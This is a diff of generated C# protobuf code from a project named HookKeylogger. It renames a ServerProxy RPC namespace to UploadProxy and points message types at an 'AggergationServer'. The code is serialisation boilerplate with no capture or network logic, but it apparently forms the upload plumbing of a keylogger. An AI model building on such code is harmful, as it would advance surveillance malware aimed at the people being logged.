@@ -7,7 +7,7 @@ using pb = global::Google.Protobuf;
 using pbc = global::Google.Protobuf.Collections;
 using pbr = global::Google.Protobuf.Reflection;
 using scg = global::System.Collections.Generic;
-namespace HookKeylogger.ServerProxy.Rpc {
+namespace HookKeylogger.UploadProxy.Rpc {
 
   [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
   public static partial class Service {
@@ -21,18 +21,18 @@ namespace HookKeylogger.ServerProxy.Rpc {
     static Service() {
       byte[] descriptorData = global::System.Convert.FromBase64String(
           string.Concat(
-            "ChlTZXJ2ZXJQcm94eS9zZXJ2aWNlLnByb3RvEgVwcm94eRoVc2VydmVyL21l", 
-            "c3NhZ2VzLnByb3RvIiQKC1NlbmRSZXF1ZXN0EhUKAmNpGAEgASgLMgkudHlw", 
-            "ZXMuQ0kiVwoMU2VuZFJlc3BvbnNlEioKBnN0YXR1cxgBIAEoDjIaLnByb3h5", 
-            "LlNlbmRSZXNwb25zZS5TdGF0dXMiGwoGU3RhdHVzEgYKAk9LEAASCQoFRVJS", 
-            "T1IQATJCCgtTZXJ2ZXJQcm94eRIzCgZTZW5kQ2kSEi5wcm94eS5TZW5kUmVx", 
-            "dWVzdBoTLnByb3h5LlNlbmRSZXNwb25zZSIAQiCqAh1Ib29rS2V5bG9nZ2Vy", 
-            "LlNlcnZlclByb3h5LlJwY2IGcHJvdG8z"));
+            "ChlTZXJ2ZXJQcm94eS9zZXJ2aWNlLnByb3RvEgNycGMaFXNlcnZlci9tZXNz", 
+            "YWdlcy5wcm90byIkCgtTZW5kUmVxdWVzdBIVCgJjaRgBIAEoCzIJLnR5cGVz", 
+            "LkNJIlUKDFNlbmRSZXNwb25zZRIoCgZzdGF0dXMYASABKA4yGC5ycGMuU2Vu", 
+            "ZFJlc3BvbnNlLlN0YXR1cyIbCgZTdGF0dXMSBgoCT0sQABIJCgVFUlJPUhAB", 
+            "Mj4KC1VwbG9hZFByb3h5Ei8KBlNlbmRDaRIQLnJwYy5TZW5kUmVxdWVzdBoR", 
+            "LnJwYy5TZW5kUmVzcG9uc2UiAEIgqgIdSG9va0tleWxvZ2dlci5VcGxvYWRQ", 
+            "cm94eS5ScGNiBnByb3RvMw=="));
       descriptor = pbr::FileDescriptor.InternalBuildGeneratedFileFrom(descriptorData,
-          new pbr::FileDescriptor[] { global::HookKeylogger.Server.Types.Messages.Descriptor, },
+          new pbr::FileDescriptor[] { global::HookKeylogger.AggergationServer.Types.Messages.Descriptor, },
           new pbr::GeneratedCodeInfo(null, new pbr::GeneratedCodeInfo[] {
-            new pbr::GeneratedCodeInfo(typeof(global::HookKeylogger.ServerProxy.Rpc.SendRequest), new[]{ "Ci" }, null, null, null),
-            new pbr::GeneratedCodeInfo(typeof(global::HookKeylogger.ServerProxy.Rpc.SendResponse), new[]{ "Status" }, null, new[]{ typeof(global::HookKeylogger.ServerProxy.Rpc.SendResponse.Types.Status) }, null)
+            new pbr::GeneratedCodeInfo(typeof(global::HookKeylogger.UploadProxy.Rpc.SendRequest), new[]{ "Ci" }, null, null, null),
+            new pbr::GeneratedCodeInfo(typeof(global::HookKeylogger.UploadProxy.Rpc.SendResponse), new[]{ "Status" }, null, new[]{ typeof(global::HookKeylogger.UploadProxy.Rpc.SendResponse.Types.Status) }, null)
           }));
     }
     #endregion
@@ -45,7 +45,7 @@ namespace HookKeylogger.ServerProxy.Rpc {
     public static pb::MessageParser<SendRequest> Parser { get { return _parser; } }
 
     public static pbr::MessageDescriptor Descriptor {
-      get { return global::HookKeylogger.ServerProxy.Rpc.Service.Descriptor.MessageTypes[0]; }
+      get { return global::HookKeylogger.UploadProxy.Rpc.Service.Descriptor.MessageTypes[0]; }
     }
 
     pbr::MessageDescriptor pb::IMessage.Descriptor {
@@ -67,8 +67,8 @@ namespace HookKeylogger.ServerProxy.Rpc {
     }
 
     public const int CiFieldNumber = 1;
-    private global::HookKeylogger.Server.Types.CI ci_;
-    public global::HookKeylogger.Server.Types.CI Ci {
+    private global::HookKeylogger.AggergationServer.Types.CI ci_;
+    public global::HookKeylogger.AggergationServer.Types.CI Ci {
       get { return ci_; }
       set {
         ci_ = value;
@@ -121,7 +121,7 @@ namespace HookKeylogger.ServerProxy.Rpc {
       }
       if (other.ci_ != null) {
         if (ci_ == null) {
-          ci_ = new global::HookKeylogger.Server.Types.CI();
+          ci_ = new global::HookKeylogger.AggergationServer.Types.CI();
         }
         Ci.MergeFrom(other.Ci);
       }
@@ -136,7 +136,7 @@ namespace HookKeylogger.ServerProxy.Rpc {
             break;
           case 10: {
             if (ci_ == null) {
-              ci_ = new global::HookKeylogger.Server.Types.CI();
+              ci_ = new global::HookKeylogger.AggergationServer.Types.CI();
             }
             input.ReadMessage(ci_);
             break;
@@ -153,7 +153,7 @@ namespace HookKeylogger.ServerProxy.Rpc {
     public static pb::MessageParser<SendResponse> Parser { get { return _parser; } }
 
     public static pbr::MessageDescriptor Descriptor {
-      get { return global::HookKeylogger.ServerProxy.Rpc.Service.Descriptor.MessageTypes[1]; }
+      get { return global::HookKeylogger.UploadProxy.Rpc.Service.Descriptor.MessageTypes[1]; }
     }
 
     pbr::MessageDescriptor pb::IMessage.Descriptor {
@@ -175,8 +175,8 @@ namespace HookKeylogger.ServerProxy.Rpc {
     }
 
     public const int StatusFieldNumber = 1;
-    private global::HookKeylogger.ServerProxy.Rpc.SendResponse.Types.Status status_ = global::HookKeylogger.ServerProxy.Rpc.SendResponse.Types.Status.OK;
-    public global::HookKeylogger.ServerProxy.Rpc.SendResponse.Types.Status Status {
+    private global::HookKeylogger.UploadProxy.Rpc.SendResponse.Types.Status status_ = global::HookKeylogger.UploadProxy.Rpc.SendResponse.Types.Status.OK;
+    public global::HookKeylogger.UploadProxy.Rpc.SendResponse.Types.Status Status {
       get { return status_; }
       set {
         status_ = value;
@@ -200,7 +200,7 @@ namespace HookKeylogger.ServerProxy.Rpc {
 
     public override int GetHashCode() {
       int hash = 1;
-      if (Status != global::HookKeylogger.ServerProxy.Rpc.SendResponse.Types.Status.OK) hash ^= Status.GetHashCode();
+      if (Status != global::HookKeylogger.UploadProxy.Rpc.SendResponse.Types.Status.OK) hash ^= Status.GetHashCode();
       return hash;
     }
 
@@ -209,7 +209,7 @@ namespace HookKeylogger.ServerProxy.Rpc {
     }
 
     public void WriteTo(pb::CodedOutputStream output) {
-      if (Status != global::HookKeylogger.ServerProxy.Rpc.SendResponse.Types.Status.OK) {
+      if (Status != global::HookKeylogger.UploadProxy.Rpc.SendResponse.Types.Status.OK) {
         output.WriteRawTag(8);
         output.WriteEnum((int) Status);
       }
@@ -217,7 +217,7 @@ namespace HookKeylogger.ServerProxy.Rpc {
 
     public int CalculateSize() {
       int size = 0;
-      if (Status != global::HookKeylogger.ServerProxy.Rpc.SendResponse.Types.Status.OK) {
+      if (Status != global::HookKeylogger.UploadProxy.Rpc.SendResponse.Types.Status.OK) {
         size += 1 + pb::CodedOutputStream.ComputeEnumSize((int) Status);
       }
       return size;
@@ -227,7 +227,7 @@ namespace HookKeylogger.ServerProxy.Rpc {
       if (other == null) {
         return;
       }
-      if (other.Status != global::HookKeylogger.ServerProxy.Rpc.SendResponse.Types.Status.OK) {
+      if (other.Status != global::HookKeylogger.UploadProxy.Rpc.SendResponse.Types.Status.OK) {
         Status = other.Status;
       }
     }
@@ -240,7 +240,7 @@ namespace HookKeylogger.ServerProxy.Rpc {
             input.SkipLastField();
             break;
           case 8: {
-            status_ = (global::HookKeylogger.ServerProxy.Rpc.SendResponse.Types.Status) input.ReadEnum();
+            status_ = (global::HookKeylogger.UploadProxy.Rpc.SendResponse.Types.Status) input.ReadEnum();
             break;
           }
         }
